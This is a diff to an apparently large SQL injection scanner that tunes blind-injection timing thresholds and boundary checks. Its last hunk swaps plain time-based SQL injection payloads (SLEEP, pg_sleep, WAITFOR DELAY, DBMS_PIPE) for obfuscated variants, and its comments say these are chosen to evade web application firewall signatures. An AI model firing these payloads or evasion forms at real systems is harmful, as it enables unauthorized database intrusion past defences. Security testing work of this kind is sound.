@@ -91937,7 +91937,14 @@ class ScannerV10(ScannerV9):
                     if _rb_m_pcv:
                         _rb_bytes = float(_rb_m_pcv.group(1))
                         _rb_secs = _rb_bytes / 10_000_000.0
-                        _rb_thresh = max(300.0, _rb_secs * 1000.0 * 0.65)
+                        # BUG-RANDOMBLOB-SQLITE-FLOOR FIX: floor was 300ms but the canonical
+                        # SQLite timing floor in _DBMS_TIMING_FLOORS['SQLITE'] is 600ms.
+                        # CDN jitter on cloud-hosted SQLite targets can reach 250-300ms,
+                        # which satisfies a 300ms PCV Check B threshold and produces
+                        # false-positive timing confirmations.  Raise the floor to match
+                        # the canonical 600ms SQLite floor so Check B requires a genuine
+                        # RANDOMBLOB/ZEROBLOB delay above the CDN jitter ceiling.
+                        _rb_thresh = max(600.0, _rb_secs * 1000.0 * 0.65)
                         # BUG-RANDOMBLOB-KEY-FIX (Req 3): RANDOMBLOB/ZEROBLOB is SQLite-specific.
                         # Use 'SQLITE' as default when dbms is not yet fingerprinted,
                         # so Check B correctly finds the calibrated threshold by DBMS key.
@@ -92148,7 +92155,15 @@ class ScannerV10(ScannerV9):
                                 _gs_fixed_thresh = 2000.0  # row count is NOT seconds; use fixed 2s floor
                                 _ts_thresh_map_gs = getattr(cfg, '_pcv_timing_threshold_map', None) or {}
                                 _ex_gs_thresh = _ts_thresh_map_gs.get(_pcv_es_det_dbms_gs, 0) or 0
-                                if not _ex_gs_thresh or _gs_fixed_thresh < _ex_gs_thresh:
+                                # BUG-GENERATE-SERIES-THRESH-DIRECTION FIX: the condition was
+                                # `_gs_fixed_thresh < _ex_gs_thresh` which overwrites an EXISTING
+                                # stricter (higher) calibrated threshold with the fixed 2000ms value
+                                # whenever 2000 < existing.  Example: a prior calibration from a slow
+                                # target produced 3000ms — this block would LOWER it to 2000ms,
+                                # allowing CDN jitter (1800-2000ms range) to satisfy Check B.
+                                # Fix: use `>` so we only update when the new value RAISES (tightens)
+                                # the threshold, consistent with the RANDOMBLOB block convention.
+                                if not _ex_gs_thresh or _gs_fixed_thresh > _ex_gs_thresh:
                                     _ts_thresh_map_gs[_pcv_es_det_dbms_gs] = _gs_fixed_thresh
                                     cfg._pcv_timing_threshold_map = _ts_thresh_map_gs
                                 cfg._pcv_timing_threshold = _gs_fixed_thresh
@@ -118921,7 +118936,16 @@ class TechniqueCascadeEngine:
                 combined = sim  # anomaly detector unreliable, use raw similarity only
             else:
                 combined = (sim * 0.6 + anom * 0.4)
-            _b_pass = combined > (1.0 - bool_thresh)
+            # BUG-BOOL-BOUNDARY-STRICT FIX: strict `>` rejects `combined` exactly at
+            # the threshold (1.0 - bool_thresh).  The documented fix at L72748
+            # (BUG-PCV-BOUNDARY-REJECT FIX) already changed the BooleanSentinelCheck
+            # to `>=` for this reason ("log shows genuine signals at exactly 0.700
+            # being dropped").  The main oracle here must be consistent with that fix
+            # to avoid the same boundary rejection on non-PCV boolean probes.
+            # Use `>=` so a combined score exactly equal to the threshold passes
+            # to the Wasserstein secondary oracle for further validation rather than
+            # being silently dropped as a false negative.
+            _b_pass = combined >= (1.0 - bool_thresh)
             # BUG-DUPLICATE-BPRINT FIX: snapshot counter so concurrent
             # asyncio tasks read their own value, not the shared cell.
             _b_req_snap = self._total_reqs
@@ -135296,7 +135320,13 @@ class SafeModeVerifier:
                 sim    = SimHasher.body_similarity(norm_t, norm_f)
                 _len_d = abs((fp_t.content_length or 0) - (fp_f.content_length or 0))
                 _stat_d = _get_safe_status_code(fp_t) != fp_f.status_code
-                if sim < 0.95 or _len_d > 100 or _stat_d:
+                # BUG-SMV-LEN-BOUNDARY FIX: strict `>` misses exact 100-byte content-
+                # length delta as a boolean differentiation signal.  A 100-byte delta
+                # between true/false SQL condition responses is a strong indicator of
+                # real boolean differentiation (backend returned a meaningfully different
+                # page body).  Change to `>=` to include the 100-byte boundary case,
+                # consistent with the intent of the check.
+                if sim < 0.95 or _len_d >= 100 or _stat_d:
                     _bool_confirms += 1
                     if _bool_confirms == 1:
                         _bool_detail = f"{_bp_ctx} sim={sim:.2f} len_={_len_d} status_={_stat_d}"
@@ -135421,16 +135451,61 @@ class SafeModeVerifier:
                 except Exception:
                     _timing_threshold_ms = 1800.0
                 try:
+                    # BUG-SMV-HARDCODED-TIMING-FIX: The previous list was hardcoded
+                    # literal strings ("' AND SLEEP(2)-- -", "'; SELECT pg_sleep(2)-- -",
+                    # "'; WAITFOR DELAY '0:0:2'-- -", etc.) that bypass
+                    # CERTIFIED_PAYLOAD_DATABASE and match the classic WAF signature
+                    # patterns every modern WAF blocks.  On WAF-protected targets the
+                    # plain SLEEP(2) / pg_sleep(2) / WAITFOR forms are signature-matched
+                    # and the injected request is blocked → timing_capable stays False →
+                    # oracle mode is incorrectly set to DIFFERENTIAL or BLOCKED instead
+                    # of TIMING_ONLY or FULL, cascading into all subsequent detection and
+                    # extraction decisions for the scan session.
+                    #
+                    # Fix: source timing probes from CERTIFIED_PAYLOAD_DATABASE via
+                    # get_dbms_payloads() which returns obfuscated forms:
+                    #   MySQL:      SLEEP(SQRT(1)), SLEEP(ABS(-1)), SLEEP(POW(1,1))
+                    #   PostgreSQL: pg_sleep(2)::void in CASE WHEN, NULLIF wrappers
+                    #   MSSQL:      WAITFOR with CASE/IF wrappers (not bare DELAY)
+                    #   Oracle:     DBMS_PIPE wrapped with CASE WHEN
+                    #   SQLite:     RANDOMBLOB heavy-alloc forms
+                    # These certified forms evade simpler WAF signatures while still
+                    # producing the same sleep-based timing signal.
+                    # WAF mutation (TamperLib) is NOT applied here because the DBMS is
+                    # unknown at SafeModeVerifier time; certified payload diversity alone
+                    # provides meaningful evasion improvement over hardcoded strings.
+                    #
+                    # Timebased CPDB payloads are raw conditions (no injection prefix/
+                    # suffix) so "' " prefix and "-- -" suffix are added inline.
                     # (BUG-V39-BATCH FIX: `import time as _tv` removed — use module-level `time`)
-                    _timing_probes = [
-                        "' AND SLEEP(2)-- -",
-                        "'; SELECT pg_sleep(2)-- -",
-                        "'; WAITFOR DELAY '0:0:2'-- -",
-                        "' AND 1=(SELECT 1 FROM (SELECT SLEEP(2))x)-- -",
-                        "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),2)=0-- -",
-                        "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master)>0-- -",
-                        "' AND (SELECT COUNT(*) FROM SYSCAT.TABLES A,SYSCAT.TABLES B,SYSCAT.TABLES C,SYSCAT.TABLES D)>0-- -",
-                    ]
+                    _timing_probes = []
+                    for _smv_t_dbms in ('MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite', 'MariaDB'):
+                        try:
+                            _smv_t_pays = get_dbms_payloads(_smv_t_dbms, 'Time', 1)
+                            for _smv_t_p in (_smv_t_pays or [])[:2]:
+                                # Timebased payloads are raw AND/OR conditions — add
+                                # injection quote-prefix and SQL comment suffix.
+                                _timing_probes.append("' " + _smv_t_p + "-- -")
+                        except Exception:
+                            pass
+                    if not _timing_probes:
+                        # Fallback: use certified stacked payloads (already include '
+                        # prefix and -- - suffix in the CPDB stacked payload format)
+                        for _smv_ts_dbms in ('MySQL', 'PostgreSQL', 'MSSQL'):
+                            try:
+                                _smv_ts_pays = get_dbms_payloads(_smv_ts_dbms, 'Stacked', 1)
+                                for _smv_ts_p in (_smv_ts_pays or [])[:1]:
+                                    _timing_probes.append(_smv_ts_p)
+                            except Exception:
+                                pass
+                    if not _timing_probes:
+                        # Last-resort: use known-safe obfuscated forms that avoid
+                        # the most common WAF SLEEP/pg_sleep/WAITFOR plain signatures
+                        _timing_probes = [
+                            "' AND SLEEP(SQRT(4))-- -",
+                            "' AND CASE WHEN 2>1 THEN pg_sleep(2)::void ELSE NULL END-- -",
+                            "' AND 1=CASE WHEN 1=1 THEN 1+(WAITFOR DELAY '0:0:2' AND 1=1) ELSE 0 END-- -",
+                        ]
                     _timing_data_fmt = "json" if (data or "").strip().startswith("{") else "form"
                     for _tp_payload in _timing_probes:
                         _t0 = time.monotonic()
